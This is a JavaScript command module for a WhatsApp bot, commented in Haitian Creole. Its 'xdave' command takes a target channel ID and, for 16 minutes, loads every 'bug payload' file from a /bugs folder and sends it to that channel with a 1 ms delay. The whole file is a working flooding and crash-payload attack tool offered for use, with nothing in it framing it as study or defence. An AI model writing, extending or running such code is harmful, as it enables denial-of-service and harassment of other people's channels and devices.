const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'xdave <channel id>',
  desc: 'Flood bug payloads nan yon WhatsApp channel pou 16 minit',
  category: 'bug',
  react: '⚡',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'xdave') return;

    const args = body.trim().split(/\s+/).slice(1);
    const channelId = args[0]; // channel id (ex: 123456789-123456@g.us)

    if (!channelId || !channelId.includes('@')) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xdave <channel id>`
      }, { quoted: mek });
    }

    // Pwoteksyon pou kanal spesifik (si ou vle)
    const protectedChannels = ['120363388484459995@g.us']; // mete channel id pwoteje isit
    if (protectedChannels.includes(channelId)) {
      return await bot.sendMessage(from, {
        text: '🛡️ Channel sa a pwoteje. Komann an sispann.'
      }, { quoted: mek });
    }

    const bugsDir = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, {
        text: '📁 Pa gen payload nan folder /bugs.'
      }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🚀 XDAVE flood kòmanse sou channel: ${channelId}\n🕒 Dire: 16 minit\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`
    }, { quoted: mek });

    const endTime = Date.now() + (16 * 60 * 1000);

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, channel) => {
              await bot.sendMessage(channel, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, channel) => {
              await bot.sendMessage(channel, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, channelId);
          }

        } catch (e) {
          console.error(`❌ Erè nan ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 1)); // 1ms delay
      }
    }

    await bot.sendMessage(from, {
      text: `✅ XDAVE flood fini sou channel: ${channelId}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Erè: ${err.message}`);
  }
});
